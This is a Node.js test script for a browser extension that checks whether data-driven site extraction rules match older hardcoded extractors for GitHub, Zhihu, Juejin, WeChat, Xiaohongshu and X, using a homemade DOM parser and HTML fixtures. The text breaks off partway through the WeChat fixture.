// Wave 3-F/6 ("sites") offline self-check (contract §6.2/§6.3/§6.4) — no browser,
// no daemon, no real page:   node daemon/test-sites.mjs
//
// What it proves:
//  1. content/site-rules.json is still byte-equivalent (as data) to the DEFAULT_SITE_RULES
//     constant inside content/bridge.js, and the six legacy *Extract functions are gone.
//  2. The rule interpreter in content/bridge.js extracts EXACTLY what the old hardcoded
//     extractors did (HEAD version, embedded below verbatim as OLD_EXTRACT_SRC) on one
//     representative fixture per site — data-driven migration must not change output.
//  3. site.rules.validate refuses: unknown ops/keys, unparsable selectors, duplicate ids,
//     and ANY executable field (eval / onload / script / html / url …), at any depth.
//  4. lib/tools-sites.js installs the SW provider: packaged JSON + chrome.storage.local
//     user overrides, user first, same-id shadowing, and the assembled set is what
//     bridge() hands to the frame on every read_site.
//  5. Degradation: an unreadable packaged file must not blank read_site.
//  6. fix13 [8]: the UNDO half — site.rules.remove {id,confirm:true} and
//     site.rules.clear {confirm:true} are judged by what chrome.storage.local
//     actually holds afterwards (never by the returned JSON), they invalidate the
//     SW rule cache so the next read_site candidate set really shrinks, and a
//     miss / an empty layer says "it was not there" instead of pretending.
//  7. fix14 [9]: the SAME read-failure gate on site.rules.add — a failed
//     chrome.storage.local.get must throw SITE_RULE_STORAGE_UNREADABLE before
//     the single set below it, so an unseen user layer is never rewritten as
//     "[the new rule]" (= every existing override silently gone).
//
// Reverse controls (§6.3) — each one breaks a precondition and MUST go red:
//   node daemon/test-sites.mjs --rc=1   # fixture selector pointed at the wrong element
//   node daemon/test-sites.mjs --rc=2   # lib copy with the executable-field guard neutered
//   node daemon/test-sites.mjs --rc=3   # lib copy with merge order flipped (builtin first)
//   # fix13 clones live OUTSIDE the repo (contract §0); generator + copies under
//   # D:/Codebase/ubb-scratch/rc/fix13/, then:
//   node daemon/test-sites.mjs --lib file:///D:/Codebase/ubb-scratch/rc/fix13/rc-1/lib   # remove answers, storage untouched
//   node daemon/test-sites.mjs --lib file:///D:/Codebase/ubb-scratch/rc/fix13/rc-2/lib   # clear inflates its count
//   # fix14 clones likewise under D:/Codebase/ubb-scratch/rc/fix14/ (generator: patch.mjs 1|2):
//   node daemon/test-sites.mjs --lib file:///D:/Codebase/ubb-scratch/rc/fix14/rc-1/lib   # add swallows the read failure into [] and writes anyway
//   node daemon/test-sites.mjs --lib file:///D:/Codebase/ubb-scratch/rc/fix14/rc-2/lib   # add's confirm:true gate taken out
// --lib <dir> swaps the lib import base (same convention as daemon/test-frames.mjs).

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const arg = (name, dflt) => {
  const inline = process.argv.find((a) => a.startsWith(`${name}=`));
  if (inline) return inline.slice(name.length + 1);
  const i = process.argv.indexOf(name);
  return i >= 0 && process.argv[i + 1] ? process.argv[i + 1] : dflt;
};
const RC = arg('--rc', '');
const LIB = new URL(arg('--lib', '../lib') + '/', import.meta.url);
const ROOT = path.resolve(fileURLToPath(import.meta.url), '..', '..');

let pass = 0;
let fail = 0;
const ok = (name, cond, detail = '') => {
  if (cond) { pass++; console.log(`  ✓ ${name}`); }
  else { fail++; console.log(`  ✗ ${name}${detail ? ` — ${detail}` : ''}`); }
};
const codeOf = async (f) => {
  try { await f(); return 'NO-THROW'; } catch (e) { return e?.code ?? 'plain throw'; }
};
const grab = async (f) => {
  try { return { r: await f(), e: null }; } catch (e) { return { r: null, e }; }
};

// ============================================================ mini DOM
// Just enough of a document for the extraction engine: a tag-soup parser, the
// element APIs both the old extractors and the new interpreter use, and a
// selector engine restricted to what site rules actually contain (tag / #id /
// .class / [attr] / [attr op "value"] / descendant / child, comma lists).
// Invalid selectors THROW, like a real browser, which is what siteRulesCheck
// probes for.

const VOID_TAGS = new Set(['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'param', 'source', 'track', 'wbr']);
const NAMED_ENTITIES = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ' };

const decode = (s) => String(s).replace(/&(#\d+|#[xX][0-9a-fA-F]+|[A-Za-z]+);/g, (m, k) => {
  if (k[0] === '#') {
    const cp = k[1] === 'x' || k[1] === 'X' ? parseInt(k.slice(2), 16) : parseInt(k.slice(1), 10);
    return Number.isFinite(cp) ? String.fromCodePoint(cp) : m;
  }
  const named = NAMED_ENTITIES[k.toLowerCase()];
  return named === undefined ? m : named;
});

class Text {
  constructor(data) { this.nodeType = 3; this.data = data; this.parentNode = null; }
  get textContent() { return this.data; }
}

class El {
  constructor(tag) {
    this.nodeType = 1;
    this.tagName = String(tag).toUpperCase();
    this.attributes = Object.create(null);
    this.childNodes = [];
    this.parentNode = null;
  }
  get localName() { return this.tagName.toLowerCase(); }
  get id() { return this.getAttribute('id') || ''; }
  get className() { return this.getAttribute('class') || ''; }
  get classList() { return this.className.split(/\s+/).filter(Boolean); }
  get children() { return this.childNodes.filter((n) => n.nodeType === 1); }
  get textContent() { return this.childNodes.map((n) => n.textContent).join(''); }
  get innerText() { return this.textContent; }
  get src() { return this.getAttribute('src') || ''; }
  get currentSrc() { return this.getAttribute('currentsrc') || this.src; }
  get href() { return this.getAttribute('href') || ''; }
  get poster() { return this.getAttribute('poster') || ''; }
  get alt() { return this.getAttribute('alt') || ''; }
  get width() { return parseInt(this.getAttribute('width'), 10) || 0; }
  get height() { return parseInt(this.getAttribute('height'), 10) || 0; }
  get naturalWidth() { return parseInt(this.getAttribute('data-natural-width'), 10) || 0; }
  get naturalHeight() { return parseInt(this.getAttribute('data-natural-height'), 10) || 0; }
  getAttribute(k) { const n = String(k).toLowerCase(); return n in this.attributes ? this.attributes[n] : null; }
  setAttribute(k, v) { this.attributes[String(k).toLowerCase()] = String(v); }
  hasAttribute(k) { return String(k).toLowerCase() in this.attributes; }
  appendChild(n) { n.parentNode = this; this.childNodes.push(n); return n; }
  remove() {
    const p = this.parentNode;
    if (!p) return;
    const i = p.childNodes.indexOf(this);
    if (i >= 0) p.childNodes.splice(i, 1);
    this.parentNode = null;
  }
  cloneNode() {
    const c = new El(this.localName);
    Object.assign(c.attributes, this.attributes);
    for (const n of this.childNodes) c.appendChild(n.nodeType === 3 ? new Text(n.data) : n.cloneNode());
    return c;
  }
  matches(sel) { return matchesSelector(this, sel); }
  closest(sel) { for (let n = this; n && n.nodeType === 1; n = n.parentNode) if (matchesSelector(n, sel)) return n; return null; }
  querySelector(sel) { return select(this, sel)[0] || null; }
  querySelectorAll(sel) { return select(this, sel); }
}

class Doc {
  constructor() { this.nodeType = 9; this.childNodes = []; this.parentNode = null; this.defaultView = null; }
  appendChild(n) { n.parentNode = this; this.childNodes.push(n); return n; }
  get textContent() { return this.childNodes.map((n) => n.textContent).join(''); }
  get documentElement() { return this.childNodes.find((n) => n.localName === 'html') || null; }
  get body() { return this.querySelector('body'); }
  get head() { return this.querySelector('head'); }
  get title() { const t = this.querySelector('title'); return t ? t.textContent.trim() : ''; }
  querySelector(sel) { return select(this, sel)[0] || null; }
  querySelectorAll(sel) { return select(this, sel); }
}

function parseHTML(html) {
  const doc = new Doc();
  const stack = [doc];
  const top = () => stack[stack.length - 1];
  let i = 0;
  while (i < html.length) {
    const lt = html.indexOf('<', i);
    if (lt < 0) { top().appendChild(new Text(decode(html.slice(i)))); break; }
    if (lt > i) top().appendChild(new Text(decode(html.slice(i, lt))));
    if (html.startsWith('<!--', lt)) { const e = html.indexOf('-->', lt); i = e < 0 ? html.length : e + 3; continue; }
    if (html[lt + 1] === '!' || html[lt + 1] === '?') { const e = html.indexOf('>', lt); i = e < 0 ? html.length : e + 1; continue; }
    const closing = /^<\/([A-Za-z][\w:-]*)\s*>/.exec(html.slice(lt));
    if (closing) {
      const name = closing[1].toLowerCase();
      for (let k = stack.length - 1; k > 0; k--) {
        if (stack[k].localName === name) { stack.length = k; break; }
      }
      i = lt + closing[0].length;
      continue;
    }
    let p = lt + 1;
    let name = '';
    while (p < html.length && /[A-Za-z0-9_-]/.test(html[p])) name += html[p++];
    if (!name) throw new Error(`unparseable tag at index ${lt}: ${html.slice(lt, lt + 30)}`);
    const attrs = Object.create(null);
    let selfClose = false;
    for (;;) {
      while (p < html.length && /\s/.test(html[p])) p++;
      if (p >= html.length) throw new Error(`unterminated tag <${name}>`);
      if (html[p] === '/') { selfClose = true; p++; continue; }
      if (html[p] === '>') { p++; break; }
      let an = '';
      while (p < html.length && !/[\s=/>]/.test(html[p])) an += html[p++];
      if (!an) throw new Error(`bad attribute in <${name}> at ${p}`);
      an = an.toLowerCase();
      while (p < html.length && /\s/.test(html[p])) p++;
      let av = '';
      if (html[p] === '=') {
        p++;
        while (p < html.length && /\s/.test(html[p])) p++;
        const q = html[p];
        if (q === '"' || q === "'") {
          p++;
          while (p < html.length && html[p] !== q) av += html[p++];
          p++;
        } else {
          while (p < html.length && !/[\s>]/.test(html[p])) av += html[p++];
        }
      }
      attrs[an] = decode(av);
    }
    const el = new El(name);
    Object.assign(el.attributes, attrs);
    top().appendChild(el);
    if (!selfClose && !VOID_TAGS.has(name.toLowerCase())) stack.push(el);
    i = p;
  }
  return doc;
}

function makeWindow(doc, href) {
  const url = new URL(href);
  const location = { href, protocol: url.protocol, hostname: url.hostname, host: url.host, pathname: url.pathname, search: url.search, origin: url.origin };
  const view = { location, document: doc, self: null, top: null };
  view.self = view;
  view.top = view;
  doc.defaultView = view;
  return view;
}

// ---- selector compile (throws SyntaxError on anything a browser would reject)
const COMB = { '>': 'child', '+': 'next', '~': 'subsequent' };

function compile(raw) {
  const src = String(raw == null ? '' : raw);
  if (!src.trim()) throw new SyntaxError('empty selector');
  let pos = 0;
  const space = () => { while (pos < src.length && /\s/.test(src[pos])) pos++; };
  const word = (re) => { let w = ''; while (pos < src.length && re.test(src[pos])) w += src[pos++]; return w; };

  const compound = () => {
    const parts = [];
    for (;;) {
      const c = src[pos];
      if (c === undefined || /[,>+~]/.test(c)) break;
      if (/\s/.test(c)) break;
      if (c === '*') { pos++; parts.push({ type: 'tag', name: '*' }); continue; }
      if (/[A-Za-z]/.test(c)) { parts.push({ type: 'tag', name: word(/[\w-]/).toLowerCase() }); continue; }
      if (c === '#' || c === '.') {
        pos++;
        const name = word(/[\w-]/);
        if (!name) throw new SyntaxError(`${c} needs an identifier at ${pos - 1}`);
        parts.push({ type: c === '#' ? 'id' : 'class', name });
        continue;
      }
      if (c === '[') {
        pos++;
        space();
        const name = word(/[\w-]/).toLowerCase();
        if (!name) throw new SyntaxError('attribute selector needs a name');
        space();
        let op = null;
        let value = null;
        const two = src.slice(pos, pos + 2);
        if (/^(=~|\^=|\$=|\*=|\|=)$/.test(two)) { op = two; pos += 2; } else if (src[pos] === '=') { op = '='; pos++; }
        if (op) {
          space();
          const q = src[pos];
          if (q === '"' || q === "'") {
            pos++;
            let v = '';
            while (pos < src.length && src[pos] !== q) v += src[pos++];
            if (src[pos] !== q) throw new SyntaxError('unterminated quoted attribute value');
            pos++;
            value = v;
          } else {
            value = word(/[^\\\]\s]/);
            if (!value) throw new SyntaxError('attribute selector needs a value');
          }
          space();
        }
        if (src[pos] !== ']') throw new SyntaxError('unterminated [attribute] selector');
        pos++;
        parts.push({ type: 'attr', name, op, value });
        continue;
      }
      if (c === ':') {
        pos++;
        if (src[pos] === ':') pos++;
        const name = word(/[A-Za-z-]/);
        if (!name) throw new SyntaxError('empty pseudo-class');
        if (src[pos] === '(') {
          let depth = 1;
          pos++;
          while (pos < src.length && depth) {
            if (src[pos] === '(') depth++;
            else if (src[pos] === ')') depth--;
            pos++;
          }
          if (depth) throw new SyntaxError('unbalanced pseudo-class arguments');
        }
        parts.push({ type: 'pseudo', name: name.toLowerCase() });
        continue;
      }
      throw new SyntaxError(`unexpected character ${JSON.stringify(c)} at ${pos}`);
    }
    if (!parts.length) throw new SyntaxError(`expected a selector at ${pos}`);
    return parts;
  };

  const complex = () => {
    const steps = [{ parts: compound(), comb: 'self' }];
    for (;;) {
      const start = pos;
      const sawSpace = /\s/.test(src[pos] || '');
      space();
      if (COMB[src[pos]]) {
        const comb = COMB[src[pos]];
        pos++;
        space();
        steps.push({ parts: compound(), comb });
      } else if (sawSpace && pos < src.length && src[pos] !== ',') {
        steps.push({ parts: compound(), comb: 'descendant' });
      } else {
        pos = start;
        break;
      }
    }
    return steps;
  };

  const list = [];
  for (;;) {
    space();
    list.push(complex());
    space();
    if (pos >= src.length) break;
    if (src[pos] === ',') { pos++; continue; }
    throw new SyntaxError(`unexpected character ${JSON.stringify(src[pos])} at ${pos}`);
  }
  return list;
}

const cache = new Map();
const sel = (raw) => {
  const hit = cache.get(raw);
  if (hit) return hit;
  const c = compile(raw);
  cache.set(raw, c);
  return c;
};

function partMatch(el, p) {
  switch (p.type) {
    case 'tag': return p.name === '*' || el.localName === p.name;
    case 'id': return el.getAttribute('id') === p.name;
    case 'class': return el.classList.includes(p.name);
    case 'pseudo': return true; // syntax probe only — no site rule depends on a pseudo for existence
    case 'attr': {
      const v = el.getAttribute(p.name);
      if (v === null) return false;
      if (!p.op) return true;
      if (p.op === '=') return v === p.value;
      if (p.op === '^=') return v.startsWith(p.value);
      if (p.op === '$=') return v.endsWith(p.value);
      if (p.op === '*=') return v.includes(p.value);
      if (p.op === '~=') return v.split(/\s+/).includes(p.value);
      if (p.op === '|=') return v === p.value || v.startsWith(p.value + '-');
      return false;
    }
    default: return false;
  }
}

function complexMatch(el, steps) {
  let k = steps.length - 1;
  let cur = el;
  for (;;) {
    if (cur.nodeType !== 1 || !steps[k].parts.every((p) => partMatch(cur, p))) return false;
    if (k === 0) return true;
    const comb = steps[k].comb;
    if (comb === 'child') {
      cur = cur.parentNode;
      if (!cur || cur.nodeType !== 1) return false;
      k--;
    } else if (comb === 'descendant') {
      let p = cur.parentNode;
      while (p && p.nodeType === 1 && !steps[k - 1].parts.every((x) => partMatch(p, x))) p = p.parentNode;
      if (!p || p.nodeType !== 1) return false;
      cur = p;
      k--;
    } else {
      return false; // sibling combinators: not used by site rules
    }
  }
}

function matchesSelector(el, raw) { return sel(raw).some((steps) => complexMatch(el, steps)); }

function select(root, raw) {
  const list = sel(raw);
  const out = [];
  const visit = (node) => {
    for (const n of node.childNodes) {
      if (n.nodeType !== 1) continue;
      if (list.some((steps) => complexMatch(n, steps))) out.push(n);
      visit(n);
    }
  };
  visit(root);
  return out;
}

// ============================================================ sources under test
const bridgeSrc = fs.readFileSync(path.join(ROOT, 'content', 'bridge.js'), 'utf8');
const sitesSrc = fs.readFileSync(new URL('tools-sites.js', LIB), 'utf8');
const ctlSrc = fs.readFileSync(new URL('bridge-ctl.js', LIB), 'utf8');
const PACKAGED = JSON.parse(fs.readFileSync(path.join(ROOT, 'content', 'site-rules.json'), 'utf8'));

const cut = (markA, markB, label) => {
  const a = bridgeSrc.indexOf(markA);
  const b = a < 0 ? -1 : bridgeSrc.indexOf(markB, a + markA.length);
  if (a < 0 || b < 0) throw new Error(`bridge.js slice "${label}" not found — markers drifted`);
  return bridgeSrc.slice(a, b);
};

// genericExtract → imgRef → DEFAULT_SITE_RULES → interpreter → extractSite →
// siteRules{Check,Set,List}: the whole rule half of the content script, one scope.
const ENGINE_SRC = cut('function genericExtract(', '// ---- user action recording', 'rule engine');

function loadEngine(doc, { fetchImpl = async () => ({ ok: false, status: 404 }) } = {}) {
  const chromeStub = { runtime: { getURL: (p) => `chrome-extension://ubb-test/${p}` } };
  const factory = new Function(
    'document',
    'window',
    'chrome',
    'fetch',
    'resolveDoc',
    `${ENGINE_SRC}
     return { extractSite, siteRulesCheck, siteRulesSet, siteRulesList, runSiteRule, DEFAULT_SITE_RULES, activeSiteRules };`,
  );
  return factory(doc, doc.defaultView, chromeStub, fetchImpl, () => doc);
}

// The HEAD (pre-migration) extractors, embedded verbatim so this file stays the
// oracle even after the old code leaves git history.
const OLD_EXTRACT_SRC = String.raw`
  function genericExtract() {
    const clone = document.body.cloneNode(true);
    for (const sel of ['script', 'style', 'noscript', 'iframe', 'svg', 'nav', 'footer', 'header']) {
      clone.querySelectorAll(sel).forEach((el) => el.remove());
    }
    const text = (clone.innerText || clone.textContent || '')
      .replace(/\n{3,}/g, '\n\n').replace(/[ \t]+/g, ' ').trim();
    const images = [];
    const main = document.querySelector('article, main, .content, .post-content, .entry-content') || document.body;
    for (const img of main.querySelectorAll('img')) {
      const src = img.src || img.getAttribute('data-src');
      if (!src || src.startsWith('data:image/svg')) continue;
      const w = img.naturalWidth || img.width || 0;
      const h = img.naturalHeight || img.height || 0;
      if (w > 0 && w < 100 && h > 0 && h < 100) continue;
      images.push({ src, alt: img.alt || '' });
    }
    return { text, images };
  }

  function imgRef(images, img, src) {
    images.push({ src, alt: img.alt || '' });
    return '![' + (img.alt || '') + ']({{IMG_' + (images.length - 1) + '}})';
  }

  function githubExtract() {
    const parts = [], images = [];
    const repo = document.querySelector('[itemprop="name"] a, .AppHeader-context-item-label');
    if (repo) parts.push('# ' + repo.textContent.trim());
    const desc = document.querySelector('.f4.my-3, [class*="About"] p, .repository-content .f4');
    if (desc) parts.push(desc.textContent.trim());
    const topics = document.querySelectorAll('.topic-tag, a[data-octo-click="topic_click"]');
    if (topics.length) parts.push('Topics: ' + [...topics].map((t) => t.textContent.trim()).join(', '));
    const readme = document.querySelector('#readme article, .markdown-body');
    if (readme) {
      parts.push('\n---\n', readme.textContent.trim());
      for (const img of readme.querySelectorAll('img')) {
        if (img.src && !/badge|shields\.io|avatar/.test(img.src)) parts.push(imgRef(images, img, img.src));
      }
    }
    const issueTitle = document.querySelector('.js-issue-title, .gh-header-title');
    if (issueTitle) {
      parts.length = 0; images.length = 0;
      parts.push('# ' + issueTitle.textContent.trim());
      const body = document.querySelector('.comment-body .markdown-body');
      if (body) {
        parts.push(body.textContent.trim());
        for (const img of body.querySelectorAll('img')) {
          if (img.src && !img.src.includes('avatar')) parts.push(imgRef(images, img, img.src));
        }
      }
      document.querySelectorAll('.timeline-comment .comment-body').forEach((c, i) => {
        if (i > 10) return;
        parts.push('---\n' + c.textContent.trim());
      });
    }
    return parts.length ? { text: parts.join('\n\n'), images, referer: 'https://github.com' } : null;
  }

  function zhihuExtract() {
    const parts = [], images = [];
    const q = document.querySelector('.QuestionHeader-title, h1.QuestionPage-title');
    if (q) parts.push('# ' + q.textContent.trim());
    const qd = document.querySelector('.QuestionHeader-detail .RichText');
    if (qd) parts.push(qd.textContent.trim());
    const richSel = 'img[data-original], img[data-actualsrc], figure img';
    document.querySelectorAll('.RichContent-inner, .Post-RichText, .RichText.ztext').forEach((answer, i) => {
      if (i > 5) return;
      const text = answer.textContent.trim();
      if (text.length <= 50) return;
      const item = answer.closest('.AnswerItem, .ContentItem');
      const author = item ? item.querySelector('.AuthorInfo-name, .UserLink-link') : null;
      if (author) parts.push('## ' + author.textContent.trim() + ' 的回答');
      parts.push(text);
      for (const img of answer.querySelectorAll(richSel)) {
        const src = img.getAttribute('data-original') || img.getAttribute('data-actualsrc') || img.src;
        if (src && !/equation|avatar/.test(src)) parts.push(imgRef(images, img, src));
      }
    });
    if (parts.length <= 1) {
      const at = document.querySelector('.Post-Title');
      const ac = document.querySelector('.Post-RichTextContainer, .RichText.ztext.Post-RichText');
      if (at) parts.push('# ' + at.textContent.trim());
      if (ac) {
        parts.push(ac.textContent.trim());
        for (const img of ac.querySelectorAll(richSel)) {
          const src = img.getAttribute('data-original') || img.getAttribute('data-actualsrc') || img.src;
          if (src && !/equation|avatar/.test(src)) parts.push(imgRef(images, img, src));
        }
      }
    }
    return parts.length ? { text: parts.join('\n\n'), images, referer: 'https://www.zhihu.com' } : null;
  }

  function juejinExtract() {
    const parts = [], images = [];
    const title = document.querySelector('.article-title, h1');
    if (title) parts.push('# ' + title.textContent.trim());
    const author = document.querySelector('.author-name, .username');
    if (author) parts.push('Author: ' + author.textContent.trim());
    const content = document.querySelector('.article-content, .markdown-body');
    if (content) {
      parts.push(content.textContent.trim());
      for (const img of content.querySelectorAll('img')) {
        const src = img.src || img.getAttribute('data-src');
        if (src && !/avatar|user-gold-cdn/.test(src)) parts.push(imgRef(images, img, src));
      }
    }
    const tags = document.querySelectorAll('.tag-list .tag, a[href*="/tag/"]');
    if (tags.length) parts.push('Tags: ' + [...tags].map((t) => t.textContent.trim()).filter(Boolean).join(', '));
    return parts.length ? { text: parts.join('\n\n'), images, referer: 'https://juejin.cn' } : null;
  }

  function wechatExtract() {
    const parts = [], images = [];
    const title = document.querySelector('#activity-name, .rich_media_title');
    if (title) parts.push('# ' + title.textContent.trim());
    const author = document.querySelector('#js_name, .rich_media_meta_nickname');
    if (author) parts.push('Author: ' + author.textContent.trim());
    const content = document.querySelector('#js_content, .rich_media_content');
    if (content) {
      parts.push(content.textContent.trim());
      for (const img of content.querySelectorAll('img[data-src]')) {
        parts.push(imgRef(images, img, img.getAttribute('data-src')));
      }
    }
    return parts.length ? { text: parts.join('\n\n'), images, referer: 'https://mp.weixin.qq.com' } : null;
  }

  function xiaohongshuExtract() {
    const parts = [], images = [], videos = [];
    const titleEl = document.querySelector('#detail-title, .note-content .title, [class*="note-title"], [class*="noteTitle"]')
      || document.querySelector('h1, [class*="title"]');
    if (titleEl) parts.push('# ' + titleEl.textContent.trim());
    let noteImages = document.querySelectorAll('.note-image-list img, [class*="slide"] img[src*="xhscdn"], [class*="swiper-slide"] img, [class*="carousel"] img[src], .media-container img');
    if (!noteImages.length) noteImages = document.querySelectorAll('img[src*="xhscdn"], img[src*="xiaohongshu"]');
    const seen = new Set();
    for (const img of noteImages) {
      const src = img.src || img.getAttribute('data-src') || img.currentSrc;
      if (!src || src.startsWith('data:') || seen.has(src)) continue;
      const w = img.naturalWidth || img.width || parseInt(img.getAttribute('width')) || 999;
      if (w < 50) continue;
      seen.add(src);
      parts.push(imgRef(images, img, src));
    }
    const contentSel = ['#detail-desc', '.note-content .desc', '[class*="note-text"]', '[class*="noteText"]', '[class*="content"] [class*="desc"]', '.note-detail .content', '[id*="detail"] [class*="desc"]'];
    let contentEl = null;
    for (const sel of contentSel) {
      const el = document.querySelector(sel);
      if (el && el.textContent.trim().length > 10) { contentEl = el; break; }
    }
    if (!contentEl) {
      let longest = '';
      for (const el of document.querySelectorAll('[class*="note"] p, [class*="note"] span, [class*="detail"] p, [class*="detail"] span')) {
        const t = el.textContent.trim();
        if (t.length > longest.length && t.length > 20) { longest = t; contentEl = el; }
      }
    }
    if (contentEl) parts.push(contentEl.textContent.trim());
    const tagEls = document.querySelectorAll('[class*="tag"] a, a[href*="/search_result/"], a[href*="/explore/"] [class*="tag"]');
    const tags = [...new Set([...tagEls].map((t) => t.textContent.trim()).filter((t) => t && t.startsWith('#')))];
    if (tags.length) parts.push('\nTags: ' + tags.join(' '));
    for (const v of document.querySelectorAll('video')) {
      let src = v.src || v.currentSrc;
      if (!src) { const s = v.querySelector('source'); if (s) src = s.src; }
      if (src && !src.startsWith('blob:')) videos.push({ src, poster: v.poster || undefined, type: 'video', referer: 'https://www.xiaohongshu.com' });
      else if (v.poster) videos.push({ src: location.href, poster: v.poster, type: 'video-blob', referer: 'https://www.xiaohongshu.com', note: 'video is blob: access via the original page' });
    }
    if (videos.length) parts.push('\n[Video: ' + videos.length + ' clip(s) captured]');
    return parts.length ? { text: parts.join('\n\n'), images, videos, referer: 'https://www.xiaohongshu.com' } : null;
  }

  function twitterExtract() {
    const parts = [], images = [], videos = [];
    const articles = document.querySelectorAll('article[data-testid="tweet"]');
    const first = articles[0];
    if (first) {
      const author = first.querySelector('[data-testid="User-Name"]');
      if (author) parts.push('@' + author.textContent.trim());
      const tweet = first.querySelector('[data-testid="tweetText"]');
      if (tweet) parts.push(tweet.textContent.trim());
      for (const img of first.querySelectorAll('[data-testid="tweetPhoto"] img')) {
        if (img.src && !/emoji|profile_images/.test(img.src)) parts.push(imgRef(images, img, img.src));
      }
      for (const v of first.querySelectorAll('video')) {
        let src = v.src || v.currentSrc;
        if (!src) { const s = v.querySelector('source'); if (s) src = s.src; }
        if (src && !src.startsWith('blob:')) videos.push({ src, poster: v.poster || undefined, type: 'video', referer: 'https://x.com' });
        else if (v.poster) videos.push({ src: location.href, poster: v.poster, type: 'video-blob', referer: 'https://x.com', note: 'video is blob: access via the original page' });
      }
      const time = first.querySelector('time');
      if (time) parts.push('Time: ' + time.getAttribute('datetime'));
      const metrics = first.querySelectorAll('[data-testid$="count"]');
      if (metrics.length) parts.push('Engagement: ' + [...metrics].map((m) => m.textContent.trim()).filter(Boolean).join(' | '));
    }
    if (!parts.length) {
      [...articles].slice(0, 20).forEach((tw) => {
        const text = tw.querySelector('[data-testid="tweetText"]');
        const author = tw.querySelector('[data-testid="User-Name"]');
        if (!text) return;
        parts.push((author ? '@' + author.textContent.split('·')[0].trim() + ': ' : '') + text.textContent.trim());
        for (const img of tw.querySelectorAll('[data-testid="tweetPhoto"] img')) {
          if (img.src && !/emoji|profile_images/.test(img.src)) parts.push(imgRef(images, img, img.src));
        }
      });
      parts.sort(() => 0); // keep timeline order
    }
    return parts.length ? { text: parts.join('\n\n---\n\n'), images, videos, referer: 'https://x.com' } : null;
  }

  function extractSite({ max_chars = 50000 } = {}) {
    const host = location.hostname;
    const routes = [
      ['github.com', githubExtract], ['zhihu.com', zhihuExtract], ['juejin.cn', juejinExtract],
      ['mp.weixin.qq.com', wechatExtract], ['xiaohongshu.com', xiaohongshuExtract],
      ['x.com', twitterExtract], ['twitter.com', twitterExtract],
    ];
    const hit = routes.find(([h]) => host.includes(h));
    let r = null;
    let site = hit ? hit[0] : 'generic';
    try { r = hit ? hit[1]() : null; } catch { r = null; }
    if (!r || !String(r.text || '').trim()) { r = genericExtract(); site = 'generic'; }
    return {
      site,
      text: String(r.text || '').slice(0, max_chars),
      images: r.images || [],
      videos: r.videos || [],
      url: location.href,
      title: document.title,
    };
  }
`;

function loadOld(doc) {
  const factory = new Function('document', 'location', `${OLD_EXTRACT_SRC}
     return { extractSite, githubExtract, zhihuExtract, juejinExtract, wechatExtract, xiaohongshuExtract, twitterExtract };`);
  return factory(doc, doc.defaultView.location);
}

// ============================================================ fixtures
const LONG = 'This answer walks through the MV3 service-worker lifetime in detail, which is long enough to clear the min_chars gate of fifty characters.';
const LONG2 = '第二篇正文同样超过五十个字符，用来验证 repeat 块的 min_chars 门与旧抽取器完全一致。';

const FIXTURES = [
  {
    name: 'github repo',
    url: 'https://github.com/ubb/repo',
    rule: 'github',
    marker: '# ubb/repo',
    html: `<html><head><title>Repository · ubb/repo</title></head><body>
      <h1 itemprop="name"><a href="/ubb/repo">ubb/repo</a></h1>
      <p class="f4 my-3">A daemon that drives your real browser.</p>
      <span class="TopicSearch"><a class="topic-tag" href="/topics/js">javascript</a><a data-octo-click="topic_click" href="/topics/r">rust</a></span>
      <div id="readme"><article class="markdown-body"><p>Install: npm i ubb</p>
        <img alt="build" src="https://github.com/ubb/repo/raw/a.png">
        <img alt="badge" src="https://img.shields.io/badge.svg"></article></div>
    </body></html>`,
  },
  {
    name: 'github issue',
    url: 'https://github.com/ubb/repo/issues/12',
    rule: 'github',
    marker: '# Daemon hangs on restricted pages',
    html: `<html><head><title>Issue 12</title></head><body>
      <h1 class="gh-header-title"><span class="js-issue-title">Daemon hangs on restricted pages</span></h1>
      <p class="f4 my-3">A daemon that drives your real browser.</p>
      <div class="timeline-comment"><div class="comment-body"><div class="markdown-body">Repro: open edge://settings
        <img src="https://github.com/uploads/1.png"><img src="https://avatars.githubusercontent.com/u/9"></div></div></div>
      <div class="timeline-comment"><div class="comment-body">Confirmed on Edge 129.</div></div>
    </body></html>`,
  },
  {
    name: 'zhihu question',
    url: 'https://www.zhihu.com/question/10086',
    rule: 'zhihu',
    marker: '的回答',
    html: `<html><head><title>如何评价 ubb</title></head><body>
      <div class="QuestionHeader-main"><h1 class="QuestionHeader-title">如何评价 ubb 这个浏览器自动化项目？</h1></div>
      <div class="QuestionHeader-detail"><div class="RichText">背景与补充说明。</div></div>
      <div class="AnswerItem"><div class="AuthorInfo"><span class="AuthorInfo-name">张三</span></div>
        <div class="RichContent-inner">${LONG}<img data-original="https://picx.zhimg.com/a.jpg"><img data-src="https://picx.zhimg.com/equation.png"></div></div>
      <div class="AnswerItem"><div class="AuthorInfo"><span class="AuthorInfo-name">李四</span></div>
        <div class="RichContent-inner">${LONG2}<figure><img src="https://pic1.zhimg.com/figure.jpg"></figure></div></div>
      <div class="AnswerItem"><div class="RichContent-inner">短答案，不超过五十个字符，应当被跳过。</div></div>
    </body></html>`,
  },
  {
    name: 'zhihu article (fallback selectors)',
    url: 'https://zhuanlan.zhihu.com/p/555',
    rule: 'zhihu',
    marker: '# 从 CDP 到 MV3',
    html: `<html><head><title>专栏</title></head><body>
      <h1 class="Post-Title">从 CDP 到 MV3：浏览器自动化随笔</h1>
      <div class="Post-RichTextContainer"><p>${LONG2}</p>
        <img data-actualsrc="https://pic1.zhimg.com/v2-abc.jpg"></div>
    </body></html>`,
  },
  {
    name: 'juejin article',
    url: 'https://juejin.cn/post/7300',
    rule: 'juejin',
    marker: 'Tags: ',
    html: `<html><head><title>掘金</title></head><body>
      <h1 class="article-title">MV3 扩展实战</h1>
      <span class="author-name">掘金用户</span>
      <div class="article-content"><p>${LONG}</p>
        <img src="https://p6-juejin.byteimg.com/cover.png">
        <img src="https://user-gold-cdn.xitu.io/avatar-x.png">
        <img data-src="https://p6-juejin.byteimg.com/lazy.png"></div>
      <div class="tag-list"><span class="tag">前端</span><span class="tag">Chrome</span></div>
      <a href="/tag/3">更多</a>
    </body></html>`,
  },
  {
    name: 'wechat article',
    url: 'https://mp.weixin.qq.com/s/abcdef',
    rule: 'wechat',
    marker: 'Author: ubb 官方号',
    html: `<html><head><title>公众号</title></head><body>
      <h1 class="rich_media_title" id="activity-name">公众号长文标题</h1>
